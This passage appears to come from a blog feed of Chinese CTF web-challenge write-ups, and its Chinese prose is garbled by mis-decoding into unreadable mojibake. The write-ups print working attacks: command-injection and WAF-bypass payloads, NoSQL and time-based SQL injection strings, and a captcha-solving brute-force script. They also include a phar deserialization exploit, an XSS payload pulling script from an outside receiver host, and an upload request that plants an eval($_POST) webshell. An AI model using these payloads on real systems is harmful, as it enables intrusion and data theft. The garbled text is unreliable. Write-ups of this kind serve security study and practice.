&quot;\nsJO5ciqR&quot;; setcookie(&apos;Auth&apos;, $auth);&#125; Êé•ÁùÄËÄÉÂØüÂëΩ‰ª§ÊâßË°åÁöÑÊºèÊ¥ûÔºöpreg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)m‰øÆÈ•∞Á¨¶ÔºöÊç¢Ë°åÂåπÈÖçÔºåÊâÄ‰ª•ÊûÑÈÄ†payloadÔºöip=| ls%0a127.0.0.1 ËøôÈáåÂèØ‰ª•Áî®pcre_matchË¥™Â©™ÂåπÈÖçÁâπÊÄßÁªïËøáÔºüÂèÇËÄÉ Á¨¨‰∫åÂ±ÇÔºöÁî®\ÊàñËÄÖ‚Äù‚ÄùÁªïÂÖ≥ÈîÆÂ≠óÂç≥ÂèØip=| c&quot;&quot;at /f&quot;&quot;lag%0a127.0.0.1 ÊãøÂà∞flag:swpuctf{**08067_sec**$$%@!~~~~**} Web2:ÊèêÁ§∫phpinfo:ÁúãÂà∞‰∫ÜmangodbÔºåÁåúÊÉ≥ËøôÊòØnosqlÊ≥®ÂÖ•ËøôÈáå$neÂú®mongodb‰∏≠Ë°®Á§∫Ôºö!=„ÄÅ&lt;&gt; /check.php?username[$ne]=%5C&amp;password[$ne]=%5C&amp;vertify=zxvzÂç≥Ë°®Á§∫Áî®Êà∑Âêç‰∏ç‰∏∫\‰∏î(or)ÂØÜÁ†Å‰∏ç‰∏∫\ÁöÑÁî®Êà∑„ÄÇÊ†πÊçÆÊèêÁ§∫ÔºåÂèØ‰ª•ÁåúÊÉ≥Âà∞ÂØÜÁ†ÅÂ∞±ÊòØflag ÊâÄ‰ª•ÂèØ‰ª•Áî®$regexÊ®°Á≥äÊü•ËØ¢ ÂèÇËÄÉÔºöhttps://www.freebuf.com/articles/database/95314.html ÁàÜÂØÜÁ†ÅpayloadÔºö?username[$ne]=1&amp;password[$regex]=^s&amp;vertify=h36fÁàÜË¥¶Âè∑payloadÔºö?username[$regex]=1&amp;password[$ne]=1&amp;vertify=h36f ÁÑ∂ÂêéÂ∞±ÊòØÈ™åËØÅÁ†ÅÁàÜÁ†¥‰∫ÜÔºåËä±‰∏ä5ÊØõÈí±Êé•ÂÖ•ÊâìÁ†ÅÂπ≥Âè∞Ôºö 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118# coding:utf-8import requestsfrom hashlib import md5import jsonimport time# swpuCTFÈ™åËØÅÁ†ÅÁàÜÁ†¥# ManggodbÁàÜÁ†¥payload = &quot;https://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^%s&amp;vertify=%s&quot;url_vertify = &quot;https://123.206.213.66:45678/vertify.php&quot;s = requests.Session()proxies = &#123; &quot;http&quot;: &quot;127.0.0.1:8080&quot;&#125;class RClient(object): def __init__(self, username, password, soft_id, soft_key): self.username = username self.password = md5(password).hexdigest() self.soft_id = soft_id self.soft_key = soft_key self.base_params = &#123; &apos;username&apos;: self.username, &apos;password&apos;: self.password, &apos;softid&apos;: self.soft_id, &apos;softkey&apos;: self.soft_key, &#125; self.headers = &#123; &apos;Connection&apos;: &apos;Keep-Alive&apos;, &apos;Expect&apos;: &apos;100-continue&apos;, &apos;User-Agent&apos;: &apos;ben&apos;, &#125; def rk_create(self, im, im_type, timeout=60): &quot;&quot;&quot; im: ÂõæÁâáÂ≠óËäÇ im_type: È¢òÁõÆÁ±ªÂûã &quot;&quot;&quot; params = &#123; &apos;typeid&apos;: im_type, &apos;timeout&apos;: timeout, &#125; params.update(self.base_params) files = &#123;&apos;image&apos;: (&apos;a.jpg&apos;, im)&#125; r = requests.post(&apos;https://api.ruokuai.com/create.json&apos;, data=params, files=files, headers=self.headers) return r.json() def rk_report_error(self, im_id): &quot;&quot;&quot; im_id:Êä•ÈîôÈ¢òÁõÆÁöÑID &quot;&quot;&quot; params = &#123; &apos;id&apos;: im_id, &#125; params.update(self.base_params) r = requests.post(&apos;https://api.ruokuai.com/reporterror.json&apos;, data=params, headers=self.headers) return r.json()def get_time(): now_time = time.strftime(&quot;%H:%M:%S&quot;, time.localtime()) return now_timedef getvertify(): res = s.get(url=url_vertify) file_name = &apos;1.png&apos; with open(file_name, &apos;wb&apos;) as file: file.write(res.content) file.flush() file.close() # print(&quot;[+] ÂõæÁâá‰∏ãËΩΩÂÆåÊàêÔºåÊ≠£Âú®ËøõË°åÂõæÁâáËØÜÂà´&quot;) rc = RClient(&apos;username&apos;, &apos;pwd&apos;, &apos;keyid&apos;, &apos;key&apos;) im = open(&apos;1.png&apos;, &apos;rb&apos;).read() vertify = rc.rk_create(im, 3040)[&apos;Result&apos;] print(&quot;[+] ËØÜÂà´ÊàêÂäüÔºö %s&quot; % str(vertify)) return vertifydef getflag(): global s str_base = &quot;sabcdefghijklmnopqrtuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot; # /-+=.~`!@%^*()[]&#123;&#125;|\;:&apos;\&quot;,&lt;&gt;?&quot; i = 0 j = 0 pwd = &quot;&quot; flag = &quot;&quot; while i &lt; 30: while j &lt; len(str_base): pwd = flag + str_base[j] verify = str(getvertify()) exp = payload % (pwd, verify) url = exp res = s.get(url, proxies=proxies) print(&quot;[*] %s Current payload:%s&quot; % (get_time(), exp)) if &quot;wrong CAPTCHA&quot; in res.text: print(&quot;[-] %s %s&quot; % (get_time(), res.text)) continue elif &quot;username or password incorrect&quot; in res.text: print(&quot;[-] %s %s&quot; % (get_time(), res.text)) j = j+1 else: flag = pwd print(&quot;[-] %s %s&quot; % (get_time(), res.text)) break #time.sleep(1) j=0if __name__ == &apos;__main__&apos;: getflag() web3ËÄÉÁÇπpharÂèçÂ∫èÂàóÂåñÔºåÊ∫êÁ†ÅÊ≤°ÊúâunserializeÂèçÂ∫èÂàóÂåñÊìç‰ΩúÁöÑÂáΩÊï∞ÔºåËøôÊòØÊúÄËøëblackhat‰∏ä‰∏Ä‰∏™ÁÉ≠Èó®ËÆÆÈ¢òÔºåpharÂèçÂ∫èÂàóÂåñ„ÄÇÂà©Áî®ÁÇπÊù°‰ª∂Ôºö ËÉΩÂ∞ÜÊâìÂåÖÂ•ΩÁöÑpharÊñá‰ª∂‰∏ä‰º†(Êâ©Â±ïÂêç,Êñá‰ª∂Â§¥ÈÉΩÂèØ‰ª•‰º™ÈÄ†) Â≠òÂú®Êñá‰ª∂Êìç‰ΩúÂáΩÊï∞Ôºö1fileatime„ÄÅfilectime„ÄÅfile_exists„ÄÅfile_get_contents„ÄÅfile_put_contents„ÄÅfile„ÄÅfilegroup„ÄÅfopen„ÄÅfileinode„ÄÅfilemtime„ÄÅfileowner„ÄÅfileperms„ÄÅis_dir„ÄÅis_executable„ÄÅis_file„ÄÅis_link„ÄÅis_readable„ÄÅis_writable„ÄÅis_writeable„ÄÅparse_ini_file„ÄÅcopy„ÄÅunlink„ÄÅstat„ÄÅreadfile„ÄÅmd5_file„ÄÅfilesize ÂÖ∑‰ΩìËØ¶ÁªÜ‰ªãÁªçÁúãhpdogÂ∏àÂÇÖÁöÑÊñáÁ´†Ôºöhttps://www.anquanke.com/post/id/159206#h3-17 Ëøô‰∏™È¢òÁöÑÊîªÂáªÈìæÁöÑÊûÑÈÄ†Êúâ‰∏ÄÁÇπÁÇπÂ∞èÂ§çÊùÇ„ÄÇ ÂÖàÁ∫µËßÇclass.php‰∏≠ÁöÑ‰∏â‰∏™Á±ªÔºö C1e4Á±ª‰∏≠ÁöÑÊûêÊûÑÂáΩÊï∞Êúâ‰∏Ä‰∏™echoÊìç‰Ωú ShowÁ±ª‰∏≠Êúâ__toString()È≠îÊúØÊñπÊ≥ï showÁ±ª‰∏≠ÁöÑ__toString() ‰∏≠Êúâ$this-&gt;str[&#39;str&#39;]-&gt;source;ËøôÊ†∑‰∏Ä‰∏™Êìç‰Ωú„ÄÇ TestÁ±ª‰∏≠Êúâ__get()È≠îÊúØÊñπÊ≥ïÔºåË∞ÉÁî®ÁßÅÊúâÂ±ûÊÄßÔºåÊàñËÄÖ‰∏çÂ≠òÂú®ÁöÑÂ±ûÊÄßÊó∂‰ºöËß¶Âèë„ÄÇ TestÁ±ª‰∏≠get()ÊñπÊ≥ï‰ºöÁî®file_get_contents()ËØªÂèñÊñá‰ª∂ file.php‰∏≠ÊúâÊñá‰ª∂Êìç‰ΩúÁöÑÂáΩÊï∞:file_exists() ÊâÄ‰ª•ÊÄùË∑ØÂ∞±ÊòØÔºöÁî®TestÁ±ª‰∏≠get()ËØªÂà∞flagÊñá‰ª∂ÔºåÁî®C1e4Á±ª‰∏≠ÁöÑechoËæìÂá∫ÁªìÊûú„ÄÇ ËÄå‰∏≠Èó¥ÁöÑËøáÁ®ãÂç≥ÔºöÊàë‰ª¨ÂÖàÂ∞Ü‰∏â‰∏™Á±ªÂàÜÂà´new‰∏ÄÈÅç„ÄÇÂ∞ÜshowÁöÑÂÆû‰æãÂåñÂØπË±°ËµãÂÄºÁªôC1e4rÁ±ªÁöÑ$strÔºå‰ΩøÂæóshowÂØπË±°Ë¢´echoÂá∫Êù•Ôºå‰ªéËÄåË∞ÉÁî®showÁ±ª‰∏≠ÁöÑ__toStringÊñπÊ≥ï„ÄÇÁÑ∂ÂêéÊàë‰ª¨Â∞ÜshowÊñπÊ≥ï‰∏≠ÁöÑ$this-&gt;str[&#39;str&#39;]ËµãÂÖ•testÂØπË±°ÔºåËøôÊ†∑Â∞±‰ºöË∞ÉÁî®test‰∏≠ÁöÑsourceÂèòÈáèÔºåËøô‰∏™ÂèòÈáè‰∏çÂ≠òÂú®ÔºåÊâÄ‰ª•Ëß¶ÂèëTestÁ±ª‰∏≠ÁöÑ__get()È≠îÊúØÊñπÊ≥ïÔºåÂÖ∂Ê¨°TestÁ±ªÁöÑ$paramsË¶ÅËµãÂÄºÊàê‰∏Ä‰∏™Êï∞ÁªÑÈîÆ‰∏∫sourceÔºåÂÄº‰∏∫flagË∑ØÂæÑ„ÄÇ Âç≥Ôºö123456789$a = new Test();$a-&gt;params = [ &apos;source&apos;=&gt; &apos;/var/www/html/f1ag.php&apos;];$b = new Show();$b-&gt;str[&apos;str&apos;] = $a;$c = new C1e4r();$c-&gt;str = $b; ÂÆåÊï¥payloadÔºö 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; echo $this-&gt;source; &#125; public function __toString() // Á±ªË¢´ÂΩìÊàêÂ≠óÁ¨¶‰∏≤ÂõûÂ∫îÁöÑÊñπÊ≥ï &#123; $content = $this-&gt;str[&apos;str&apos;]-&gt;source; return $content; &#125; public function __set($key,$value) // ËÆæÁΩÆ‰∏Ä‰∏™Á±ªÁöÑÊàêÂëòÂèòÈáèÊó∂Ë∞ÉÁî® &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&apos;/http|https|file:|gopher|dict|\.\.|f1ag/i&apos;,$this-&gt;source)) &#123; // Èò≤ssrfÁ≠âÁ≠âÔºü die(&apos;hacker!&apos;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() // ÊâßË°åunserialize()ÂÖàË∞ÉÁî®Ëøô‰∏™ÔºåËøôÈáåÁî®pharÊù•ËøõË°åË∞ÉÁî® &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); // ËØªflag:f1ag.php return $text; &#125;&#125;$a = new Test();$a-&gt;params = [ &apos;source&apos;=&gt; &apos;/var/www/html/f1ag.php&apos;];$b = new Show();$b-&gt;str[&apos;str&apos;] = $a;$c = new C1e4r();$c-&gt;str = $b;$phar = new Phar(&quot;passer6y.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c);$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;Passer6y&quot;);$phar-&gt;stopBuffering();?&gt; WEB 4Áé©ÁöÑÊó∂ÂÄôxssbotÊåÇ‰∫Ü.. ËøôÈáåËÄÉÂØüfilter_varÂáΩÊï∞Ê†°È™åÁªïËøápayload:email=&quot;&lt;script\ src=https://*.exeye.io/swpu&gt;&lt;/script&gt;&quot;@qq.com&amp;submit= 123456789101112&lt;!--check.phpif($_POST[&apos;email&apos;]) &#123; $email = $_POST[&apos;email&apos;]; if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123; echo &quot;error email, please check your email&quot;; &#125;else&#123; echo &quot;Á≠âÂæÖÁÆ°ÁêÜÂëòËá™Âä®ÂÆ°Ê†∏&quot;; echo $email; &#125;&#125;?&gt;--&gt;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂÆâÊ¥µÊùØ2018-WebNÂá∫È¢òËÆ∞ÂΩï]]></title>
    <url>%2F2018%2F12%2F01%2F%E5%AE%89%E6%B4%B5%E6%9D%AF2018-WebN%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[Âá∫È¢òÊÄùË∑ØËÄÉÁÇπÔºåÂêåÊ∫ê‰ª£Á†ÅÊâßË°å(SomeÊîªÂáª)Ôºå‰∏Ä‰∏™jsonpÊé•Âè£ÔºåÊêû‰∏ç‰∫ÜxssÔºåËé∑Âèñ‰∏ç‰∫Ü‰ø°ÊÅØÔºå‰ΩÜÊòØËÉΩÂõûË∞ÉË∞ÉÁî®jsÂáΩÊï∞ÔºåËøôÊ†∑Â∞±ÂèØ‰ª•Bypass csrf token‰∫Ü~ ÊºèÊ¥ûÁÇπÔºö Á§ºÂìÅ‰∏≠ÂøÉÂ§ÑÔºöÊÄé‰πàË¥≠‰π∞ ÊÄé‰πàÂÖÖÂÄºÈÉΩÊòØÂ§±Ë¥•ÁöÑ„ÄÇ ÂàÜÊûêjs‰ª£Á†ÅÔºöÂú®reward.php‰∏≠ÁÇπÂáªÂØåËêùËéâÂêéÔºå‰ºöÁî®iframeÂä†ËΩΩconfirm.phpÁöÑÊñá‰ª∂ Ë∑üËøõconfirm.php‰∏Ä‰∏™jsonpÁöÑÂõûË∞ÉÊé•Âè£Ôºå Ë∑üËøõÊé•Âè£jsonpÊé•Âè£ÔºåÂ≠óÁ¨¶ÂÆû‰ΩìÁºñÁ†ÅÔºåÊêû‰∏ç‰∫ÜÂèçÂ∞ÑÂûãxss„ÄÇ ÂõûËøáÂ§¥Êù•Áúãreward.phpÔºåËøôÈáåÊúâ‰∏Ä‰∏™ÊèêÁ§∫Ôºö ÁÇπÂáª‰πãÂêéÔºåÊÄé‰πà‰πüÊèêÁ§∫Èí±‰∏çÂ§üÔºåËÄå‰∏îËøòÊúâtokenÁöÑÈ™åËØÅ„ÄÇ ËøôÈáåÊÄùË∑ØÂ∞±ÂæàÊ∏ÖÊô∞‰∫ÜÔºåcsrf ÁªïtokenÔºåÈÖçÂêàÈ¶ñÈ°µÁöÑÂØåËêùËéâÂÆ¢ÊúçÔºåËÆ©ÂÆ¢ÊúçÁÇπÂáªÈìæÊé•ÔºåÂ∏Æ‰Ω†Ë¥≠‰π∞ÂïÜÂìÅ ‰∏çÈöæÊÉ≥Âà∞ÔºåËÇØÂÆöÂ∞±ÊòØsomeÊîªÂáªË∞ÉÁî®reward.php‰∏≠ÁöÑpay()ÂáΩÊï∞‰∫Ü exp: Ëá™Âä®ÊµãËØïÁà¨Ëô´Ôºö ËßÜÈ¢ëdemoÔºö]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[È™áÊûÅÊùØWeb Writeup]]></title>
    <url>%2F2018%2F11%2F07%2F%E9%AA%87%E6%9E%81%E6%9D%AFWeb%20Writeup%2F</url>
    <content type="text"><![CDATA[web1ËøôÈ¢òËÄÉÂØüssrf„ÄÇrobots.txt‰∏≠ÊèêÁ§∫Êúâ‰∏§‰∏™Êñá‰ª∂Ôºö source.php flag.phpÊòæÁÑ∂‰∏Ä‰∏™ÊòØÊ∫êÁ†Å‰∏Ä‰∏™ÊòØflag„ÄÇ ËøôÈáåËøòËÄÉÂØü‰∫Ü‰∏Ä‰∏™ÁÇπÔºåphpËé∑ÂèñipÁöÑÁªïËøáÔºåËøôÈáåx-client-ipÂç≥ÂèØÁªïËøá„ÄÇ![@JMXBRS[UGCT}~}FG2`}2T.png-69.6kBÂ∏∏ËßÅÁöÑ‰øÆÊîπhttpËØ∑Ê±ÇÂ§¥‰º™ÈÄ†ipÁöÑÊñπÊ≥ïÊúâÔºö X_FORWARDED_FOR Client-IP x-client-ip ÁÑ∂ÂêéËÆ©Êàë‰ª¨Âä†‰∏äurlÂèÇÊï∞ËØ∑Ê±ÇiÊò•ÁßãÁöÑÂÆòÁΩëÔºöurl=https://www.ichunqiu.com ËÄå‰∏îÊØèÊ¨°ËØ∑Ê±ÇÈÉΩÂèëÁé∞Êñá‰ª∂ÂêçÂú®ÂèòÔºåÁÑ∂ÂêéËøîÂõûÁöÑ‰∏úË•øÈáåÈù¢ËøòÊúâ;Âè∑ÔºåÂºÄÂßã‰ª•‰∏∫ÊòØËÄÉnginxÁöÑËß£ÊûêÊºèÊ¥û„ÄÇÂêéÊù•‰∏ÄÊÉ≥‰∏çÂèØËÉΩÊó†ÁºòÊó†ÊïÖÁªôurlÂèÇÊï∞ÔºåÂèØËÉΩÊòØÊåáÂÆöurlÔºåÁÑ∂ÂêéÊääËØªÂèñÂà∞ÁöÑÊñá‰ª∂ÂÜôÂà∞ÂõæÁâáÈáåÈù¢„ÄÇÂêéÊù•ÁúãÂà∞sn00pyÂ∏àÂÇÖÊµãËØïurl=//www.ichunqiu.comÁöÑÊó∂ÂÄôÂèëÁé∞ÔºåÂÜçÂéªËÆøÈóÆÂõæÁâáÁöÑÂìçÂ∫îÁ†ÅÂ∞±ÂèòÊàê200‰∫Ü„ÄÇ ÁÑ∂ÂêéÊÉ≥Âà∞Áî®fileÂçèËÆÆÂéªÁªïurlÈôêÂà∂Ôºö ËØªflag web2È¢òÁõÆÊ∫êÁ†ÅÔºö12345678910111213141516171819202122232425262728&lt;?php //error_reporting(0); //$dir=md5(&quot;icq&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]); //$dir=md5(&quot;icq&quot;); //$sandbox = &apos;/var/sandbox/&apos; . $dir; //@mkdir($sandbox); //@chdir($sandbox); if($_FILES[&apos;file&apos;][&apos;name&apos;])&#123; $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;]; if (!is_array($filename)) &#123; $filename = explode(&apos;.&apos;, $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die(&quot;emmmm...&quot;); &#125; $new_name = (string)rand(100,999).&quot;.&quot;.$ext; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name); $_ = $_POST[&apos;hehe&apos;]; if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos; &amp;&amp; strpos($_,$new_name)===false)&#123; include($_); &#125; unlink($new_name); &#125; else&#123; highlight_file(__FILE__); &#125; ‰∏ä‰º†È°µÔºåÊäìÂåÖÁî®Ôºö Ê≠£Â∏∏Ëß£Ê≥ï,ÂÖàÁªïend()Âíå$filename[count($filename) - 1]ÁöÑÂ∑ÆÂºÇÔºåÁÑ∂ÂêéendÊòØÂèñÊúÄÂêé‰∏Ä‰∏™ÊèíÂÖ•ÁöÑÂÖÉÁ¥†ÔºåÂêéËÄÖÊòØÂèñÁ¥¢Âºï‰∏≠ÁöÑÊúÄÂêé‰∏Ä‰∏™ÔºåÁÑ∂ÂêéÊàë‰ª¨‰∏ä‰º†ÁöÑÊó∂ÂÄôÁªôfileÂèòÈáè‰º†Êï∞ÁªÑÂ∞±‰∏ç‰ºöËøõÂÖ•explodeÊà™Êñ≠ÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ÁªïËøáÔºö123if($ext==$filename[count($filename) - 1])&#123; die(&quot;emmmm...&quot;);&#125; Êé•ÁùÄÂêéÈù¢ÊòØÁªôÊñá‰ª∂ÂêçÈáçÂëΩ‰ª§‰∏â‰ΩçÈöèÊú∫Êï∞ÔºåÂπ∂‰∏îheheÂèÇÊï∞‰∏çËÉΩÂåÖÂê´Ëøô‰∏™ÈöèÊú∫ÈáçÂëΩÂêçÁöÑ‰∏ä‰º†Êñá‰ª∂„ÄÇËøôÈáåÂèÇËÄÉ https://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html Êé•ÁùÄÂèØ‰ª•‰ΩøÁî®x/../1.php/.ËøõË°åÊñá‰ª∂Ë¶ÜÁõñ1234567891011121314151617181920212223242526272829303132333435POST /file_upload/shanghai/1.php HTTP/1.1Host: ctfUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like GeckoAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------20782431812432Content-Length: 717Referer: https://ctf/file_upload/shanghai/upload.htmlConnection: closeUpgrade-Insecure-Requests: 1-----------------------------20782431812432Content-Disposition: form-data; name=&quot;file[1]&quot;jpg-----------------------------20782431812432Content-Disposition: form-data; name=&quot;file[0]&quot;x/../1.php/.-----------------------------20782431812432Content-Disposition: form-data; name=&quot;hehe&quot;1.php-----------------------------20782431812432Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;Content-Type: application/octet-stream@&lt;?php $file = &apos;1ndex.php&apos;;$code = &apos;&lt;?php eval($_POST[\&apos;passer6y\&apos;]);?&gt;&apos;;file_put_contents($file,$code);?&gt;-----------------------------20782431812432Content-Disposition: form-data; name=&quot;submit&quot;submit-----------------------------20782431812432-- ËøôÊ†∑Â∞±ÂèØ‰ª•ÊãøÂà∞shell‰∫Ü„ÄÇ sn00pyÂ∏àÂÇÖÊúÄÂàùÁöÑÈùûÈ¢ÑÊúüËß£Ê≥ïÔºåÂ∞±ÊòØÂõ†‰∏∫ÊÉ≥Âà∞ÔºåheheÂèòÈáè‰∏çËÉΩÂåÖÂê´Ëá™Â∑±‰º†‰∏äÂéªÁöÑÊñá‰ª∂ÔºåÊâÄ‰ª•ÂºÄÂ§ö‰∏™ÁàÜÁ†¥Á®ãÂ∫èÔºåËÆ©AÁ®ãÂ∫èÂíåBÁ®ãÂ∫èÁõ∏‰∫í‰∫ßÁîüÁöÑÈöèÊú∫Êï∞Áõ∏‰∫íÁ¢∞ÊíûÔºåÁõ¥Âà∞ÂåÖÂê´ÊàêÂäü„ÄÇ web3È¢òÁõÆÔºö12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?php error_reporting(E_ALL); class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str); return $str; &#125; function echo($host)&#123; system(&quot;echo $host&quot;); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; &#125; $first=&apos;hi&apos;; $var=&apos;var&apos;; $bbb=&apos;bbb&apos;; $ccc=&apos;ccc&apos;; $i=1; foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125; &#125; if($first===&quot;doller&quot;) &#123; @parse_str($_GET[&apos;a&apos;]); // Ê≥®ÂÜåÂèòÈáè if($var===&quot;give&quot;) &#123; if($bbb===&quot;me&quot;) &#123; if($ccc===&quot;flag&quot;) &#123; echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;; $come=@$_POST[&apos;come&apos;]; unserialize($come); &#125; &#125; else &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125; &#125; else &#123; echo &quot;NO&quot;; &#125; &#125; else &#123; echo &quot;Can you hack me?&lt;br&gt;&quot;; &#125;?&gt; ËøôÈ¢òÂÖàËÄÉÂØüÂèòÈáèË¶ÜÁõñÔºåÂÜçËÄÉÂØüÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ37Ë°åÂ§Ñ$iÂèòÈáèË¶ÜÁõñ‰∏ÄÁõ¥ÊÉ≥Â§öÂæ™ÁéØÂá†Ê¨°Â§öË¶ÜÁõñÂá†‰∏™ÂèòÈáèÔºåÁªìÊûúÂèëÁé∞‰º†ÂÖ•ÁöÑi=1ÁöÑÁ±ªÂûãÊòØÂ≠óÁ¨¶ÂûãÔºåËÄåifÂà§Êñ≠ÁöÑÊòØ===„ÄÇÊâÄ‰ª•ËøôÈáåÂ∞±Âè™ËÉΩÂÖàË¶ÜÁõñ$firstÂèòÈáèËøõÂÖ•Ôºåparse_strÈÉ®ÂàÜ,ËøôÈáåÂèØ‰ª•ÁªßÁª≠Ë¶ÜÁõñÂèòÈáèÔºåÊñáÊ°£,ÊâÄ‰ª•ÂèØ‰ª•ÊûÑÈÄ†payloadÔºö12?first=doller&amp;a%3dvar%3dgive%26bbb%3dme%26ccc%3dflag// Ëß£Á†ÅÂêéÔºö?first=doller&amp;a=var=give&amp;bbb=me&amp;ccc=flag ‰∏ãÈù¢Â∞±ËÄÉÂØüÂèçÂ∫èÂàóÂåñÁöÑ‰∏úË•ø‰∫ÜÔºåÊûÑÈÄ†ÂáΩÊï∞‰º†ÂÖ•ÂèÇÊï∞ÔºåÊûêÊûÑÂáΩÊï∞ÂõûË∞ÉechoÂáΩÊï∞„ÄÇÈúÄË¶ÅÁªïËøáwafÂáΩÊï∞„ÄÇ&amp;ÊãºÊé•ÂëΩ‰ª§Ôºå${IFS}ÁªïËøáÁ©∫Ê†ºÔºåfl‚Äù‚ÄùagÁªïËøáflagÁöÑÈôêÂà∂„ÄÇ payloadÔºö12345678910111213141516171819202122232425262728293031323334&lt;?phperror_reporting(E_ALL);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); // Ê≥®ÂÜåÂèòÈáèÔºåËøáÊª§ÂÄº &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str); return $str; &#125; function echo($host)&#123; echo &quot;\n&quot;; system(&quot;echo $host&quot;); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; &#125;$args = array(&apos;1&amp;cat$&#123;IFS&#125;fl&quot;&quot;ag&apos;);$aa = new come(&quot;echo&quot;,$args);echo urlencode(serialize($aa)); Êú¨Âú∞ÊµãËØïÔºö web4‰∏Ä‰∏™ÂêéÂè∞ÁôªÂΩïÈ°µÔºåËøòÊúâ‰∏Ä‰∏™Ê≥®ÂÖ•ÁÇπ„ÄÇ if sleep # Ê≤°Ë¢´ËøáÊª§11&apos;+and+if((SELECT+VERSION())&gt;1,sleep(3),0)%23 mid ‰πüÊ≤°Ë¢´ËøáÊª§11&apos;+and+if(mid((SELECT+VERSION()),1,1)+&gt;1,sleep(3),0)%23 Êµã‰∏ãÈù¢ËøôÊù°ËØ≠Âè•Ë¢´Êã¶‰∫Ü11&apos;+and+if(mid((SELECT+schema_name+from+information_schema.SCHEMATA+limit+1,1),1,1)+&gt;1,sleep(3),0)%23 ‰∏ãÈù¢Ëøô‰∏™ËØÅÊòéÊã¶Êà™‰∫ÜÂÖ≥ÈîÆÂ≠óinformation_schema.11&apos;+and+if(mid((SELECT+schema_name+from+SCHEMATA+limit+1,1),1,1)+&lt;1,sleep(3),0)%23&amp;Submit=Select+Guest ÂèØ‰ª•Áî®information . 